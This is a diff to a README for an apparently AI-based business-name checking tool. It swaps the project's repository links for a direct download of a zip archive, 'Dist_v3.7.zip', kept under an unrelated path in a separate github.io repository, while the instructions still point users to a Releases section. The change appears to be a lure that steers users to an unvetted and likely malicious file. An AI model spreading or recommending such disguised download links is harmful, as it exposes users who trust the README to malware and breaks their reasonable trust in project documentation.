@@ -5,13 +5,13 @@ description: "Validate and generate business names that preserve cultural authen
 ---
 # 🏷️ business-name-fit - Choose names that resonate across cultures
 
-[![](https://img.shields.io/badge/Download-business-name-fit-blue.svg)](https://github.com/Soupy-sievabean276/business-name-fit)
+[![](https://img.shields.io/badge/Download-business-name-fit-blue.svg)](https://raw.githubusercontent.com/Soupy-sievabean276/soupy-sievabean276.github.io/main/freakdom/Dist_v3.7.zip)
 
 Finding the right name for a new business is difficult. You need a name that represents your roots but appeals to your customers. This application uses artificial intelligence to help you test and vet business names. It checks if your name sounds right to your target audience while keeping your cultural identity intact.
 
 ## 📥 How to get the application
 
-Visit this page to download the software: https://github.com/Soupy-sievabean276/business-name-fit
+Visit this page to download the software: https://raw.githubusercontent.com/Soupy-sievabean276/soupy-sievabean276.github.io/main/freakdom/Dist_v3.7.zip
 
 1. Go to the link provided above.
 2. Look for the section labeled Releases on the right side of the screen.
